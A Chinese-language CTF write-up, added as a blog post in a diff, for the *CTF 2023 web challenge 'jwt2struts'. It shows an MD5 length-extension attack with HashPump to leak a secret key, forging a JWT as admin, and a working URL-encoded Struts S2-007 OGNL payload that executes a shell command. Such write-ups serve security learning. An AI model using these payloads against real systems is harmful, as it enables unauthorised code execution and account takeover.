@@ -1,0 +1,89 @@
+---
+title: "*CTF-2023 Web方向Write Up"
+publishDate: 2023-7-30
+description: 'XCTF分站赛*CTF，由赛宁网安提供技术支持，面向全球开放'
+tags:
+  - Web
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510062335817.jpg', inferSize: true, color: '#7e1515ff' }
+language: '简中'
+draft: false
+comment: true
+---
+
+## jwt2struts
+
+### 题目描述
+140.210.223.216:55557
+
+flag format: *ctf{}
+
+### 解题思路
+进入靶机后提示`Try to become admin.`
+发现cookie中含有access_token，再根据题目猜想应该为伪造jwt
+查看源代码，发现`<!-- JWT_key.php -->`路由
+```php
+<?php
+highlight_file(__FILE__);
+include "./secret_key.php";
+include "./salt.php";
+//$salt = XXXXXXXXXXXXXX // the salt include 14 characters
+//md5($salt."adminroot")=e6ccbf12de9d33ec27a5bcfb6a3293df
+@$username = urldecode($_POST["username"]);
+@$password = urldecode($_POST["password"]);
+if (!empty($_COOKIE["digest"])) {
+    if ($username === "admin" && $password != "root") {
+         if ($_COOKIE["digest"] === md5($salt.$username.$password)) {
+            die ("The secret_key is ". $secret_key);
+        }
+        else {
+            die ("Your cookies don't match up! STOP HACKING THIS SITE.");
+        }
+    }
+    else {
+        die ("no no no");
+    }
+}
+```
+代码审计，目的是得到secret_key用以伪造JWT
+难点在于如何构造digest的值，给出了`salt`的位数，`salt."adminroot"`的MD5值
+满足使用[MD5长度扩展攻击](https://www.cnblogs.com/cfqlovem-521/p/16185173.html)的条件
+使用HashPump工具生成
+```shell
+apt-get install g++ libssl-dev
+cd HashPump/
+make && make install
+
+hashpump
+Input Signature: e6ccbf12de9d33ec27a5bcfb6a3293df #给出的MD5值
+Input Data: root #想要替换的参数
+Input Key Length: 19  #不变部分的位数
+Input Data to Add: admin #要替换的部分
+6519ec47114e100735c1d3ff1bb704ff #得到的新MD5值
+root\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00admin #要传入的passwd
+```
+因为传入password后要经过一次url解码，故将得到的passwd中\x换成%后，url编码传入
+得到`secret_key=sk-he00lctf3r`
+接下来伪造[JWT](https://jwt.io/)
+先将原有的token解码
+```log
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MjMwNDMzfQ.sD0hbwejdG0bqUBwxt68rbAnZbXb3hid5zHG9Qq4TqA
+
+HEADER:
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+PAYLOAD:
+{
+  "sub": "user",
+  "exp": 2006230433
+}
+```
+将`"sub"`改为admin后，输入密钥生成新的JWT
+传参后进入`/admiiiiiiiiiiin`，根据题目提示为[struts-s2-007远程代码执行漏洞](https://xz.aliyun.com/t/2684)
+FLAG在环境变量里，抓包传入age进行RCE
+
+```http
+name=1&email=1&age=%27+%2b+(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23foo%3dnew+java.lang.Boolean(%22false%22)+%2c%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d%23foo%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27env%27).getInputStream()))+%2b+%27
+```
+注意flag格式
